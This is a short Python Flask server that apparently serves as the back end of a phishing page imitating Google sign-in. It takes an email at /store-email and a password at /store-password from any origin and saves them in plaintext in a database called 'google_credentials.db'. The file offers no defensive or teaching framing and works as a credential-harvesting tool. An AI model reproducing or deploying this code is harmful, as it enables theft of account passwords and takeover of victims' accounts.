from flask import Flask, request, jsonify
from flask_cors import CORS
import sqlite3
import os

app = Flask(__name__)
CORS(app)

# Get the current directory
BASE_DIR = os.path.dirname(os.path.abspath(__file__))
DB_PATH = os.path.join(BASE_DIR, 'google_credentials.db')

def init_db():
    try:
        conn = sqlite3.connect(DB_PATH)
        c = conn.cursor()
        c.execute('''
            CREATE TABLE IF NOT EXISTS credentials (
                id INTEGER PRIMARY KEY AUTOINCREMENT,
                email TEXT NOT NULL,
                password TEXT,
                timestamp DATETIME DEFAULT CURRENT_TIMESTAMP
            )
        ''')
        conn.commit()
    except Exception as e:
        print(f"Database initialization error: {e}")
    finally:
        conn.close()

@app.route('/store-email', methods=['POST'])
def store_email():
    try:
        data = request.get_json()
        email = data.get('email')
        
        if not email:
            return jsonify({"error": "Email is required"}), 400

        conn = sqlite3.connect(DB_PATH)
        c = conn.cursor()
        c.execute("INSERT INTO credentials (email) VALUES (?)", (email,))
        conn.commit()
        conn.close()

        return jsonify({"status": "success", "message": "Email stored successfully"})
    except Exception as e:
        return jsonify({"error": str(e)}), 500

@app.route('/store-password', methods=['POST'])
def store_password():
    try:
        data = request.get_json()
        email = data.get('email')
        password = data.get('password')
        
        if not email:
            return jsonify({"error": "Email is required"}), 400

        conn = sqlite3.connect(DB_PATH)
        c = conn.cursor()
        
        # First check if email exists
        c.execute("SELECT id FROM credentials WHERE email = ?", (email,))
        result = c.fetchone()
        
        if result:
            # Update existing record
            c.execute("UPDATE credentials SET password = ? WHERE email = ?", 
                     (password, email))
        else:
            # Insert new record
            c.execute("INSERT INTO credentials (email, password) VALUES (?, ?)", 
                     (email, password))
            
        conn.commit()
        conn.close()

        return jsonify({"status": "success", "message": "Credentials stored successfully"})
    except Exception as e:
        return jsonify({"error": str(e)}), 500

if __name__ == '__main__':
    init_db()
    app.run(port=5000, debug=True)